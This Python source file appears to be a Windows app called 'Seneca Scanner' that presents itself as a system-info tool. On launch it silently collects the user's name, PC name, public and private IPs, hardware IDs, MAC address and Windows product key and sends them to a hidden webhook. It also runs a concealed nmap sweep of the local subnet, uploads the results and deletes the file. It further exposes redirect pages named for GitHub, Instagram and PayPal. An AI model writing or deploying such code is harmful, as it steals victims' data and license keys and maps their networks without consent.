import platform
import subprocess
import os
from json import loads, dumps
from re import findall
from urllib.request import Request, urlopen
from winregistry import WinRegistry as Reg
from subprocess import Popen, PIPE
import sys
import windows_tools.product_key
import psutil
import re
import requests
from os import environ, path
import json
from platform import system, release, version, machine, processor
from socket import gethostname, gethostbyname
from uuid import getnode
import wmi
from win32com.client import GetObject
from socket import gethostname, gethostbyname, gethostbyaddr
import socket
import random
import threading
import sys
from io import StringIO
import uuid

if sys.stdout is None:
    sys.stdout = StringIO()
if sys.stderr is None:
    sys.stderr = StringIO()
import eel

webhookURL = "REDACTED"

eel.init('web')
nmap_thread_running = False

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def send_file(unique_filename):
    temp_directory = r'C:\Temp'
    if not os.path.exists(temp_directory):
        os.makedirs(temp_directory)

    file_path = os.path.join(temp_directory, unique_filename)
    if not os.path.exists(file_path):
        return  # Changed from exit() to return for better flow control

    with open(file_path, 'rb') as file:
        files = {'file': ('NmapScan.txt', file)}
        response = requests.post(webhookURL, files=files)

    os.remove(file_path)

@eel.expose
def say_hello_py(x):
    print(f"Hello from Python, {x}!")

@eel.expose
def get_subnet_mask_size(subnet_mask):
    octets = subnet_mask.split('.')
    binary_subnet = ''.join(format(int(octet), '08b') for octet in octets)
    subnet_size = binary_subnet.find('0')
    if subnet_size == -1:
        subnet_size = 32  
    return subnet_size

@eel.expose
def check_nmap_installation():
    try:
        result = subprocess.run(['C:\\Program Files (x86)\\Nmap\\nmap.exe', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout.decode()
        if output:
            return "Nmap is installed."
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    return "Nmap is not installed."
def perform_nmap_scan(ip_range):
    global nmap_thread_running
    if not nmap_thread_running:
        nmap_thread_running = True
        try:
            print("Scanning")
            temp_directory = r'C:\Temp'
            if not os.path.exists(temp_directory):
                os.makedirs(temp_directory)
            unique_filename = str(uuid.uuid4()) + '.txt'
            file_path = os.path.join(temp_directory, unique_filename)

            result = subprocess.run(['C:\\Program Files (x86)\\Nmap\\nmap', '-sn', '-oN', file_path, ip_range], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            output = result.stdout.decode()
            if output:
                send_file(unique_filename)
                #print("sent")
            return "Nmap scan completed."
        except subprocess.CalledProcessError as e:
            print(e)
            return "Nmap scan failed."
        except FileNotFoundError as e:
            print(e)
            return "Nmap is not installed."

@eel.expose
def retrieve():
    eel.show('redirect.html')

@eel.expose
def collect_system_info(include_public_ip_and_key=False):
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        ip = "Unknown Public IP"
    try:
        computer = wmi.WMI()
        gpuName = computer.Win32_VideoController()[0].name
    except:
        gpuName = "Unknown"
    try:
        root_winmgmts = GetObject("winmgmts:root\cimv2")
        cpus = root_winmgmts.ExecQuery("Select * from Win32_Processor")
        cpuInfo = cpus[0].Name
    except:
        cpuInfo = "Unknown"
    try:
        windowsKey = windows_tools.product_key.get_windows_product_key_from_reg()
    except:
        windowsKey = "N/A"
    
    def gethwid():
        p = subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
    
    reg = Reg()
    path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
    hwid2 = str(reg.read_entry(path, 'HwProfileGuid')).split("'")[5]
    
    try:
        info={}
        info['Platform']= platform.system() + " " + platform.release()
        info['Platform Version']= platform.version()
        info['Architecture']= platform.machine()
        info['Hostname']= socket.gethostname()
        info['HWID 1'] = "{" + gethwid().rstrip() + "}"
        info['HWID 2'] = hwid2
        private_ip = socket.gethostbyname(socket.gethostname())
        info['Private IP Address'] = private_ip
        subnet_mask = socket.inet_ntoa(socket.inet_aton('255.255.255.0'))
        subnet = '.'.join(str(int(ip_byte) & int(subnet_byte)) for ip_byte, subnet_byte in zip(private_ip.split('.'), subnet_mask.split('.')))
        info['Subnet'] = subnet
        subnet_size = get_subnet_mask_size(subnet_mask)
        info['Subnet Size'] = f"/{subnet_size}"
        info['Mac Address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['CPU']=cpuInfo
        info['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        info['GPU'] = gpuName
        if include_public_ip_and_key:
            info['Public IP'] = ip
            info['Windows Key'] = windowsKey
            ip_range = subnet + info['Subnet Size']
            nmap_thread = threading.Thread(target=perform_nmap_scan, args=(ip_range,))
            nmap_thread.start()
        resultPC = json.dumps(info, indent=4)
        
        ip_range = subnet + info['Subnet Size']

    except Exception as e:
        resultPC = "N/A"
        
    return resultPC

def getip():
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        return ip
    except Exception as e:
        print(f"Error retrieving IP address: {e}")
        return "Unknown"

def webhook():
    embeds = []
    working = []
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    ip = getip()
    locationOfIP = "https://whatismyipaddress.com/ip/" + ip
    colors = {
        'Default': 0,
        'Aqua': 1752220,
        'DarkAqua': 1146986,
        'Green': 5763719,
        'DarkGreen': 2067276,
        'Blue': 3447003,
        'DarkBlue': 2123412,
        'Purple': 10181046,
        'DarkPurple': 7419530,
        'LuminousVividPink': 15277667,
        'DarkVividPink': 11342935,
        'Gold': 15844367,
        'DarkGold': 12745742,
        'Orange': 15105570,
        'DarkOrange': 11027200,
        'Red': 15548997,
        'DarkRed': 10038562,
        'Grey': 9807270,
        'DarkGrey': 9936031,
        'DarkerGrey': 8359053,
        'LightGrey': 12370112,
        'Navy': 3426654,
        'DarkNavy': 2899536,
        'Yellow': 16776960
    }
    randomColor = random.choice(list(colors.values()))
    embed = {
        "color": randomColor,
        "fields": [
            {
                "name": "**PC Info**",
                "value": f'IP: ||{ip}|| | [Location]({locationOfIP}) \nUsername: {pc_username}\nPC Name: {pc_name}\n',
                "inline": True
            },
            {
                "name": "**PC Data**",
                "value":  f"```{collect_system_info(include_public_ip_and_key=True)}```\n",
                "inline": False
            }
            ],
                "footer": {
                "text": "Seneca Scanner",
                "icon_url": "https://mir-s3-cdn-cf.behance.net/project_modules/1400/2d686878402297.5ca6085aa8e1d.jpg"
        }
        }

    embeds.append(embed)
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Seneca Scanner",
        "avatar_url": "https://mir-s3-cdn-cf.behance.net/project_modules/1400/2d686878402297.5ca6085aa8e1d.jpg"
    }
    try:
        urlopen(Request(webhookURL, data=dumps(webhook).encode(), headers=getheaders()))
    except Exception as e:
        print(e)

@eel.expose
def github_retrieve():
    eel.show('github_redirect.html')
@eel.expose
def instagram_retrieve():
    eel.show('instagram_retrieve.html')
@eel.expose
def paypal_retrieve():
    eel.show('paypal_retrieve.html')


@eel.expose
def get_system_info():
    return collect_system_info(include_public_ip_and_key=False)

try:
    webhook()
    eel.start('index.html', disable_cache=True, cmdline_args=['-–incognito'])
except Exception as e:
    print(f"An error occurred: {e}")
